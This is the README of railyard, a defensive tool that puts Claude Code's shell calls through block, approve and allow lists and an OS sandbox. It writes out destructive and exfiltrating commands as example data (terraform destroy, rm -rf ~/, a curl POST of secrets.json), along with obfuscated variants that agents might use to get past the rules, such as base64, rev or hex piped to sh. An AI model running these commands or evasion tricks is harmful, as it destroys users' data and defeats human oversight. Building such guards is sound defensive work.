<p align="center">
  <h1 align="center">railyard</h1>
  <p align="center"><strong>Use <code>--dangerously-skip-permissions</code> without the danger.</strong></p>
</p>

<p align="center">
  <a href="https://github.com/railyarddev/railyard/stargazers"><img src="https://img.shields.io/github/stars/railyarddev/railyard?style=flat" alt="GitHub stars"></a>
  <a href="https://opensource.org/licenses/MIT"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License: MIT"></a>
  <img src="https://img.shields.io/badge/tests-141%20passed-brightgreen" alt="Tests">
  <img src="https://img.shields.io/badge/built%20with-Rust-orange.svg" alt="Built with Rust">
  <a href="https://discord.gg/MyaUZSus"><img src="https://img.shields.io/badge/discord-join-7289da.svg" alt="Discord"></a>
</p>

<p align="center">
  <a href="#the-problem">The Problem</a> &middot;
  <a href="#install">Install</a> &middot;
  <a href="#how-it-works">How it works</a> &middot;
  <a href="#configure-it-your-way">Configure</a> &middot;
  <a href="SECURITY.md">Security</a> &middot;
  <a href="docs/ARCHITECTURE.md">Architecture</a> &middot;
  <a href="#contributing">Contributing</a> &middot;
  <a href="https://discord.gg/MyaUZSus">Discord</a>
</p>

---

## The Problem

You want Claude Code to be fully autonomous. You want to type a prompt and walk away. You want `--dangerously-skip-permissions`.

But you've seen what happens:

| When | What happened |
|------|---------------|
| Feb 2026 | Claude Code ran `terraform destroy` on production. **1.9M rows gone.** |
| Feb 2026 | A background agent ran `drizzle-kit push --force`. **60 tables wiped.** |
| 2025-26 | Agents ran `rm -rf ~/`, `git reset --hard`, `DROP DATABASE` on live systems. |

So you're stuck clicking "Allow" on every shell command like it's a cookie banner. That's not productivity — that's babysitting.

## The Solution

Think of rail tracks in Japan. The Shinkansen goes 320 km/h — not because it has fewer safety systems, but because it has *more*. The rails, the signaling, the earthquake detection — all of it exists so the train can go **faster**, not slower.

Railyard is the same idea. Install it once, and Claude Code runs at full speed with `--dangerously-skip-permissions` — because the rails keep it from going somewhere it shouldn't.

```
$ railyard install && claude --dangerously-skip-permissions

  Agent runs: npm install && npm run build
  ✅ (instant, no prompt)

  Agent runs: git add -A && git commit -m "feat: add auth"
  ✅ (instant, no prompt)

  Agent runs: terraform destroy --auto-approve
  ⛔ BLOCKED — "This was the command behind the DataTalks 1.9M row deletion."

  Agent runs: curl -X POST https://api.example.com -d @secrets.json
  ⚠️  APPROVE — "HTTP POST may exfiltrate data" [y/n]?
```

Normal work flows through instantly. Destructive commands are hard-blocked. Sensitive operations ask you once. That's it.

---

## Install

```bash
cargo install --git https://github.com/railyarddev/railyard.git
railyard install
```

Two commands. You're done. Now use `claude --dangerously-skip-permissions` and stop babysitting.

Default mode is **hardcore** — blocks destructive commands, fences sensitive paths, detects evasion attempts, sandboxes every shell command at the OS level.

Want a lighter touch?

```bash
railyard install --mode chill
```

Chill mode blocks the obvious stuff (`terraform destroy`, `rm -rf /`, `DROP TABLE`) and gets out of the way for everything else.

---

## How It Works

When you run `railyard install`, three things happen:

1. **Hooks** get registered in Claude Code's settings. Every tool call (Bash, Write, Edit, Read) passes through Railyard in <2ms.
2. **Sandbox shell** gets set as Claude Code's shell. Every Bash command runs inside `sandbox-exec` (macOS) or `bwrap` (Linux) at the kernel level.
3. **CLAUDE.md** gets updated so Claude knows about Railyard, knows how to use rollback, and knows not to try to disable it.

You keep using `claude` exactly as before. Nothing changes in your workflow.

### What happens to each command

Every tool call hits three checks, in order:

```
Command comes in
  │
  ├─ Is it in the allowlist?          → ✅ Allow instantly
  │
  ├─ Is it in the blocklist?          → ⛔ Hard block (agent gets error message)
  │
  ├─ Is it in the approve list?       → ⚠️  Ask you once (y/n prompt)
  │
  └─ None of the above?              → ✅ Allow instantly
```

Most commands — `npm install`, `cargo build`, `git commit`, file edits — don't match any rule. They flow through in <2ms with zero friction.

### The three responses

| Response | What the agent sees | What you see |
|----------|-------------------|--------------|
| **Allow** | Nothing — command runs normally | Nothing — you don't even know Railyard is there |
| **Block** | Error message explaining why + what to do instead | Nothing (unless you check traces later) |
| **Approve** | Pauses until you respond | A y/n prompt in your terminal |

---

## Two Modes

| | **Chill** | **Hardcore** (default) |
|---|---|---|
| **Philosophy** | Don't blow stuff up | Full lockdown |
| Destructive commands | Blocked | Blocked |
| Self-protection | On | On |
| Network policy | — | curl\|sh blocked, POST/wget/ssh need approval |
| Credential protection | — | env dump, git config --global need approval |
| Evasion detection | — | base64, hex, eval, rev\|sh, Python obfuscation |
| Path fencing | — | Project dir only. ~/.ssh, ~/.aws, /etc denied |
| Threat escalation | — | Suspicious patterns → warn → session kill |
| OS sandbox | — | Every Bash command kernel-sandboxed |
| Trace logging | On | On |
| Snapshots + rollback | On | On |

**Chill** = for developers who trust their agent but want a safety net for the catastrophic stuff.

**Hardcore** = for production environments, shared machines, or when you're running agents unattended overnight.

---

## Configure It Your Way

Railyard is not opinionated about *your* workflow. The defaults block things that no sane developer would do by accident. Beyond that, you customize.

### Ask Claude to configure it

The easiest way — just ask Claude Code:

```
You: "Help me set up railyard for this project. I need to allow terraform plan
      but block terraform apply without approval."
```

Claude will read your `railyard.yaml`, propose changes, and you approve or reject each edit in the standard permission prompt. Claude can suggest, but only you can accept.

### Or edit the config directly

```bash
railyard init    # Creates railyard.yaml in your project
```

```yaml
# railyard.yaml
version: 1

blocklist:
  - name: terraform-destroy
    tool: Bash
    pattern: "terraform\\s+(destroy|apply\\s+.*-auto-approve)"
    action: block
    message: "Blocked: terraform destroy is destructive"

approve:
  - name: terraform-apply
    tool: Bash
    pattern: "terraform\\s+apply"
    action: approve
    message: "terraform apply needs human sign-off"

allowlist:
  - name: terraform-plan
    tool: Bash
    pattern: "terraform\\s+plan"
    action: allow

fence:
  enabled: true
  denied_paths:
    - "~/.ssh"
    - "~/.aws"
    - "~/.gnupg"
```

Changes take effect immediately — no restart needed. The policy file walks up directories like `.gitignore`, so you can have org-wide defaults and per-project overrides.

### Or use the interactive setup

```bash
railyard configure    # Terminal UI to toggle protections
railyard chat         # Launch Claude Code as a policy assistant
```

---

## What Gets Blocked (Default Rules)

### Destructive commands — blocked in both modes

| Rule | What it catches | Why it exists |
|------|----------------|---------------|
| `terraform-destroy` | `terraform destroy`, `apply -auto-approve` | 1.9M row deletion incident |
| `rm-rf-critical` | `rm -rf /`, `~/`, `$HOME` | Home directory wipes |
| `sql-drop` | `DROP TABLE`, `DATABASE`, `SCHEMA` | Production database loss |
| `git-force-push` | `git push --force` | Overwrites remote history |
| `git-reset-hard` | `git reset --hard` | Destroys uncommitted work |
| `drizzle-force` | `drizzle-kit push --force` | 60-table drop incident |
| `disk-format` | `mkfs`, `dd of=/dev/` | Disk destruction |
| `k8s-delete-ns` | `kubectl delete namespace` | Namespace deletion |
| `aws-s3-rm-recursive` | `aws s3 rm --recursive` | S3 data loss |

### Evasion detection — hardcore only

Agents have been [documented trying to bypass safety rules](https://github.com/anthropics/claude-code/issues/29691). Railyard normalizes commands before matching:

```
Direct:     terraform destroy                           → ⛔ blocked
Base64:     echo dGVycmFmb3Jt... | base64 -d | sh      → decoded    → ⛔ blocked
Variable:   CMD="terraform destroy"; $CMD               → expanded   → ⛔ blocked
Shell wrap: sh -c "terraform destroy"                   → unwrapped  → ⛔ blocked
Eval:       eval "ter""raform destroy"                  → joined     → ⛔ blocked
Hex:        $'\x74\x65\x72\x72...'                      → decoded    → ⛔ blocked
Rev pipe:   rev <<< 'yortsed mrofarret' | sh            → shape      → ⛔ SESSION KILLED
Python:     python3 -c "...b64decode..."                → detected   → ⛔ SESSION KILLED
```

### Self-protection — both modes

The agent cannot disable Railyard:

- `railyard uninstall` → blocked
- Editing `~/.claude/settings.json` → blocked
- Removing the railyard binary → blocked
- Editing `railyard.yaml` → requires your approval
- Changing modes (`railyard install --mode chill`) → requires your approval
- Actually uninstalling → requires a native OS dialog click (an AI can't click GUI buttons)

---

## Recovery

Every file write is snapshotted. If something goes wrong:

```bash
railyard log                                    # List sessions
railyard diff --session <id>                    # See what changed
railyard rollback --session <id> --steps 1      # Undo last edit
railyard rollback --session <id> --steps 5      # Undo last 5 edits
railyard rollback --session <id> --file path    # Restore one file
railyard rollback --session <id>                # Undo entire session
```

Or ask Claude: *"Something went wrong, can you check what changed and roll it back?"* — Claude can run `railyard context --session <id> --verbose` to understand what happened and suggest the right rollback command.

---

## CLI Reference

```
railyard install [--mode chill|hardcore]   Set up protection (default: hardcore)
railyard uninstall                         Remove protection (requires GUI confirmation)
railyard status                            Show what's active
railyard init [--mode chill|hardcore]      Create railyard.yaml in current directory
railyard configure                         Interactive setup
railyard chat                              Policy assistant via Claude Code

railyard log [--session <id>]              View traces
railyard rollback --session <id> [opts]    Undo changes
railyard context --session <id> [-v]       Session summary (for Claude to read)
railyard diff --session <id> [--file]      Show diffs

railyard sandbox status                    Check OS sandbox availability
railyard sandbox generate                  Write sandbox profiles
railyard sandbox run -- <command>          Run one command sandboxed
```

---

## Security

- **[SECURITY.md](SECURITY.md)** — Threat model, architecture, what it does and doesn't protect against
- **[docs/ARCHITECTURE.md](docs/ARCHITECTURE.md)** — Technical deep dive into every module
- **[PENTEST-REPORT.md](PENTEST-REPORT.md)** — 3 rounds of adversarial red teaming, 28 attack vectors

---

## Testing

```bash
cargo test    # 141 tests: 78 unit + 36 attack sim + 15 rollback + 12 threat detection
```

Test suite includes real incident reproductions, evasion attempts, threat detection scenarios, sandbox profile generation, self-protection verification, and rollback workflows.

---

## Contributing

Railyard is early. We'd love your help.

**Good first issues:**
- Add new blocklist rules for common footguns
- Test on Windows and Linux
- Improve evasion detection

**Bigger projects:**
- Support for Cursor, Windsurf, Codex, and other agents
- `railyard watch` — live TUI dashboard
- LLM-as-judge for non-deterministic evasion detection
- Policy inheritance (org defaults + project overrides)

```bash
git clone https://github.com/railyarddev/railyard.git
cd railyard && cargo test
```

Join the [Discord](https://discord.gg/MyaUZSus) to discuss ideas.

---

## License

MIT License. Copyright 2026 Ari Choudhury.
